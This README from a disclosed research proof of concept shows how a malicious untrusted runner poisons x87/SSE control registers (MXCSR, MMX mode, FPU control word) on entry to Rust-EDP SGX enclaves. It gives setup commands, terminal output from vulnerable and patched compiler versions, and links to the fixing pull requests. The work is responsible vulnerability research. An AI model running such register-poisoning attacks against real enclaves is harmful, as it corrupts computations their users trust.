# Proof-of-concept exploitation with malicious runner

This directory includes a minimal PoC showcasing insufficient ABI sanitization
in Rust-EDP. The PoC shows that untrusted code controls x87 and SSE
configuration registers on enclave entry, which got fixed after our disclosure
in newer Rust-EDP versions. We furhtermore show that the initial fix did not
suffice and attackers could still override the expected result of an exemplary
x87 FPU computation with unexpected NaN outcomes. This too got fixed after our
disclosure in newest Rust-EDP versions.

## Rust-EDP installation

The untrusted runner is included in a fork of the rust-sgx repo, while the
trusted enclave runtime is part of the Rust compiler. Instructions below also
include how to easily switch between vulnerable and patched compiler versions.

### Install vulnerable Rust-EDP

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
rustup default nightly-2020-02-01
rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-02-01
rustc --version

cd rust-sgx-fpu
git revert fb5cae4dbcafb4729fdf7852268e75b1e7e9182e # llvm_asm -> asm
cargo install --path ./fortanix-sgx-tools fortanix-sgx-tools
cargo install --path ./sgxs-tools sgxs-tools
echo >> ~/.cargo/config -e '[target.x86_64-fortanix-unknown-sgx]\nrunner = "ftxsgx-runner-cargo"'

# Check your SGX setup
sgx-detect

# Run the FPU poisoning enclave!
cd hello-world
cargo run --target x86_64-fortanix-unknown-sgx
```

### Vulnerable Rust-EDP version (SSE MXCSR + x87 control word + x87 tag)

```bash
$ rustup default nightly-2020-02-01
$ rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-02-01
$ rustc --version
rustc 1.42.0-nightly (cd1ef390e 2020-01-31)

$ cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.02s
     Running `ftxsgx-runner-cargo target/x86_64-fortanix-unknown-sgx/debug/hello-world`
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

$ fpu-runner ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[enclave] Hello, world!
Pi      = 3.1411454399906846290946305089164525270462036132812500000000000000
MXCSR   = 0x5fa0
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

$ fpu-runner --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[enclave] Hello, world!
Pi      = 3.1411454399906846290946305089164525270462036132812500000000000000
MXCSR   = 0x5fa0
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = NaN
```

### Patched Rust-EDP version (x87 tag)

```bash
$ rustup default nightly
$ rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly
$ rustc --version
rustc 1.46.0-nightly (feb3536eb 2020-06-09)

$ cargo run
   Compiling hello-world v0.1.0 (/home/jo/Documents/sgx-floats/pocs/rust-edp/hello-world)
    Finished dev [unoptimized + debuginfo] target(s) in 0.18s
     Running `ftxsgx-runner-cargo target/x86_64-fortanix-unknown-sgx/debug/hello-world`
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

$ fpu-runner ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

$ fpu-runner --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = NaN
```

### Install latest (patched) Rust-EDP

```bash
rustup default nightly
rustup target add x86_64-fortanix-unknown-sgx --toolchain nightly-2020-02-01
rustc --version
```

### FPUCW poisoning

To go to newest version:

```bash
$ rustup update
$ rustup default nightly
$ rustc --version
rustc 1.46.0-nightly (0c03aee8b 2020-07-05)
```

```
$ rustc --version
rustc 1.46.0-nightly (feb3536eb 2020-06-09)
jo@breuer:~/Documents/sgx-floats/pocs/rust-edp/hello-world$ fpu-runner --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = NaN
$ cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.01s
     Running `ftxsgx-runner-cargo target/x86_64-fortanix-unknown-sgx/debug/hello-world`
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000

$ fpu-runner --fpu 123 --mmx ./target/x86_64-fortanix-unknown-sgx/debug/hello-world.sgxs
[attacker] MXCSR=0x5f80
[attacker] putting CPU in MMX mode..
[attacker] poisoning FPUCW with 0x7b
[enclave] Hello, world!
Pi      = 3.1411454399906841850054206588538363575935363769531250000000000000
MXCSR   = 0x1fa0
FPUCW   = 0x37f
num     = 0.1234567889999999973360544913703051861375570297241210937500000000
2*num   = 0.2469135779999999946721089827406103722751140594482421875000000000
add_fpu = 0.2469135779999999946721089827406103722751140594482421875000000000
```

## Disclosure and mitigation

We disclosed the core FPU sanitization issue in December 2019 which was addressed with a `ldmxcsr/csw` instruction [<https://github.com/rust-lang/rust/pull/69040>].

After further investigation, we found that this left the attacker open to perform the MMX attack as described in the paper. We also disclosed this issue and it is patched in the Rust compiler in version 1.46.0. The mitigation can be followed via this Pull Request [<https://github.com/rust-lang/rust/pull/73471>].
